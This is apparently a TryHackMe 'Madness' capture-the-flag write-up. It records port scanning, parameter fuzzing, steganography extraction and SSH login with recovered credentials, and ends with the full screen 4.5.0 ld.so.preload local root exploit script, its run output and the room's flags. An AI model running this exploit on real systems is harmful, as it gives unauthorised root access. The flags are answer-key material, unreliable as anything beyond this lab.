# Box Name

## Madness

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
- ## nmap
```bash
┌──(kn1ght㉿Kali)-[~/THM/Madness]
└─$ mkdir nmap logs notes files
                                                                                                                                                                                                                                              
┌──(kn1ght㉿Kali)-[~/THM/Madness]
└─$ rustscan -a 10.10.32.164  --ulimit 5000 -- -sCV -oN nmap/initial
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.32.164:22
Open 10.10.32.164:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnNdHQKU4ZvpWn7Amdx7LPhuwUsHY8p1O8msRAEkaIGcDzlla2FxdlnCnS1h+A84lzn1oubZyb5vMrPM8T2IsxoSU2gcbbgfq/3giAL+hmuKm/nD43OKRflSHlcpIVgwQOVRdEfbQSOVpV5VBtJziA1Xu2dts2WWtawDS93CBtlfyeh+BuxZvBPX2k8XPWwykyR6cWbdGz1AAx6oxNRvNShJ99c9Vs7FW6bogwLAe9SWsFi2oB7ti6M/OH1qxgy7ZPQFhItvI4Vz2zZFGVEltL1fkwk2dat8yfFNWwm6+/cMTJqbVb7MPt3jc9QpmJmpgwyWuy4FTNgFt9GKNOJU6N
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGMMalsXVdAFj+Iu4tESrnvI/5V64b4toSG7PK2N/XPqOe3q3z5OaDTK6TWo0ezdamfDPem/UO9WesVBxmJXDkE=
|   256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB3zGVeEQDBVK50Tz0eNWzBJny6ddQfBb3wmmG3QtMAQ
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- ## ferox
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.32.164
 🚀  Threads               │ 60
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/raft-small-words.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403, 404, 301]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox
 💲  Extensions            │ [html, txt, php, js, cgi]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
200      376l      972w        0c http://10.10.32.164/
200      376l      972w        0c http://10.10.32.164/index.php
[####################] - 13m   258018/258018  307/s   http://10.10.32.164
[####################] - 13m   258018/258018  308/s   http://10.10.32.164/

```


- ## stego
	- read sorce code of index.php
	- found comment
![[Pasted image 20220529115650.png]]

go to the location and get an error 
![[Pasted image 20220529115931.png]]
- ## downloaded the file 
	- ### opened file in exedit it showed to have the png magic bytes
	- ### googled  magic bytes for jpg
		-  https://en.wikipedia.org/wiki/List_of_file_signatures
		- opened file in hexedit and changed the magic bytes to jpg
![[Pasted image 20220529120522.png]]

- ## navigate to new directory /th1s_1s_h1dd3n/
	- ![[Pasted image 20220529125013.png]]

- ### tried several different parameters like id,guess but secret was the correct one
	- #### used wfuzz with seq to fuzz for secret
```bash
┌──(kn1ght㉿Kali)-[~/THM/Madness]
└─$ seq 0 99 > nums.txt | wfuzz -c -z file,nums.txt -u http://10.10.32.164/th1s_1s_h1dd3n/?secret=FUZZ                                                                                   
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 /usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning:1.12.1-git20200711.33e2d80-dfsg1-0.6 is an invalid version and will not be supported in a future release
 /usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning:1.16.0-unknown is an invalid version and will not be supported in a future release
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.32.164/th1s_1s_h1dd3n/?secret=FUZZ
Total requests: 100

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                      
=====================================================================
                                                                                                                                                                         
000000070:   200        18 L     53 W       408 Ch      "69"                                                                                                                                                                         
000000072:   200        18 L     53 W       408 Ch      "71"                                                                                                                                                                         
000000076:   200        18 L     53 W       408 Ch      "75"                                                                                                                                                                         
000000078:   200        18 L     53 W       408 Ch      "77"                                                                                                                                                                         
000000075:   200        18 L     53 W       408 Ch      "74"                                                                                                                                                                         
000000077:   200        18 L     53 W       408 Ch      "76"                                                                                                                                                                         
000000074:   200        18 L     61 W       445 Ch      "73"  <==                                                                                                                                                                       
000000071:   200        18 L     53 W       408 Ch      "70"                                                                                                                                                                         
000000073:   200        18 L     53 W       408 Ch      "72"                                                                                                                                                                         

```

- ### found secret number
![[Pasted image 20220529125810.png]]

- #### was not able to decipher y2RPJ4QaPF!B
	- ### went back to the thm.jpg and used steghide to see if this might be a pass phrase 
```bash
┌──(kn1ght㉿Kali)-[~/THM/Madness]
└─$ steghide extract -sf thm.jpg   
Enter passphrase: 
wrote extracted data to "hidden.txt".
                                                                                                                                                                                                                                              
┌──(kn1ght㉿Kali)-[~/THM/Madness]
└─$ cat hidden.txt 
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!

```

cool now have a username but is it encoded too??

- ### started with https://www.dcode.fr/caesar-cipher to see if i could decipher the string
	- used the decrypt (bruteforce) option to decrypt  the string got a hit on rot13

![[Pasted image 20220529131053.png]]

- #### now I have a username
	- ### joker
	- looking back at the task description 
![[Pasted image 20220529131730.png]]

ssh bruteforcing not needed hummmm

- ### downloaded the image from the task description
	- ### `https://i.imgur.com/5iW7kC8.jpg`
	- ran stegseek on it and got a password.txt file
```bash
┌──(kn1ght㉿Kali)-[~/THM/Madness]
└─$ stegseek 5iW7kC8.jpg ~/rockyou.txt                                                                
StegSeek version 0.5
Progress: 0.00% (0 bytes)           

[i] --> Found passphrase: ""
[i] Original filename: "password.txt"
[i] Extracting to "5iW7kC8.jpg.out"

```

- #### cat password.txt
```bash
┌──(kn1ght㉿Kali)-[~/THM/Madness]
└─$ cat password.txt 
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP

```
## Initial Foothold
---
- ## ssh
	- ### finally on the box
	- ### ssh in with joker's creds
```bash
┌──(kn1ght㉿Kali)-[~/THM/Madness]
└─$ ssh joker@10.10.32.164            
The authenticity of host '10.10.32.164 (10.10.32.164)' can't be established.
ED25519 key fingerprint is SHA256:B0gcnLQ9MrwK4uUZINN4JI6gd+EofSsF2e8c5ZMDrwY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.32.164' (ED25519) to the list of known hosts.
joker@10.10.32.164's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
joker@ubuntu:~$ 

```

---
## Privilege Escalation


- ### searched for suid binaries 
	- *find / -perm -4000 2>/dev/null*
	- found screen-4.5.0
```bash
joker@ubuntu:/etc# find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0  <==
/bin/screen-4.5.0.old <==
/bin/mount
/bin/ping
/bin/umount

```
	
- ## googled screen-4.5.0 exploits 
	- found https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
	- and exploitDB had this
	```bash
	#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

using nano created this script and ran

```bash
joker@ubuntu:~$ bash exploit.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
 from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.

# python3 -c 'import pty;pty.spawn("/bin/bash")'

root@ubuntu:/etc#
```

```bash
root@ubuntu:/etc# cat /root/root.txt
'THM{5ecd98aa66a6abb670184d7547c8124a}'
root@ubuntu:/etc# cat /home/joker/user.txt
'THM{d5781e53b130efe2f94f9b0354a5e4ea}'
root@ubuntu:/etc# 

```